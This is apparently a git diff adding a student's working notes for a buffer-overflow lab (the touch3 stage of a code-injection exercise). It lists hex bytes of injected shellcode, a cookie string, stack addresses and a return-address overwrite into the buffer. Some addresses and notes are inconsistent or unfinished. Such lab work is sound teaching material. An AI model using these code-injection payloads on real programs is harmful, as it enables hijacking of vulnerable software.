@@ -1,0 +1,45 @@
+68 8f 19 40 00 00 00 00 #push touch3
+
+48 8d 3c 25 e8 99 66 55 #lea    0x556699e8,%rdi
+
+   0:	48 8d 3c 25 e0 99 66 	lea    0x556699e0,%rdi
+   7:	55 
+
+
+   0:	48 c7 c7 e0 99 66 55 	mov    $0x556699e0,%rdi
+
+
+
+
+556699e0
+
+556699d8
+
+
+
+d8 99 66 55 00 00 00 00
+
+
+
+
+
+buffer size: 0x18 (24 bytes)
+48 8d 3c 25 e8 99 66 55
+68 8f 19 40 00 c3 00 00
+33 63 31 65 66 66 34 35
+
+d8 99 66 55 00 00 00 00
+
+
+buffer(injected code):
+0x556699d8 // mov string to %rdi
+0x556699e0 // push touch3 to stack
+0x556677e8 // location of string
+
+input(neturn back to buffer):
+0x556699f0 //overwrites return with address of injected code
+
+
+not enough space for NULL byte to terminate string
+
+i think i have to move the stack pointer to avoid hexmatch overwriting //48 2b 24 25 02 00 00 00
